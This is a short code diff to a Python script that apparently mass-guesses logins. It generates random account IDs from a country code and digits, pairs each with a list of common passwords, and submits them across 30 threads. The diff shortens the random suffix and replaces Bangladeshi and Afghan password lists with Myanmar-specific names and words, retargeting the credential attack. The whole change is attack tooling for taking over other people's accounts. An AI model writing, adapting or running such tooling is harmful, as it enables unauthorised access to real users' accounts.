@@ -204,7 +204,7 @@ def bd():
 	except ValueError:
 		limit = 5000
 	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(8))
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nmp)
 	with tred(max_workers=30) as REHAN:
 		clear()
@@ -215,7 +215,7 @@ def bd():
 		linex()
 		for psx in user:
 			ids = code+psx
-			passlist = ['i love you','bangladesh','freefire','bangla123','bangladesh123',ids,psx]
+			passlist = ['kyawkyaw','myanmar','aungaung','chitchit','chitlay','zawzaw',ids,psx]
 			REHAN.submit(rd1,ids,passlist)
 	print('\033[1;37m')
 	linex()
@@ -245,7 +245,7 @@ def afg():
 		linex()
 		for psx in user:
 			ids = code+psx
-			passlist = [ids,psx,'100200','afghanistan','Afghan123','afghan1122','kabul123']
+			passlist = [ids,psx,'kyawkyaw','myanmar','aungaung','chitchit','chitlay','zawzaw']
 			REHAN.submit(rd1,ids,passlist)
 	print('\033[1;37m')
 	linex()
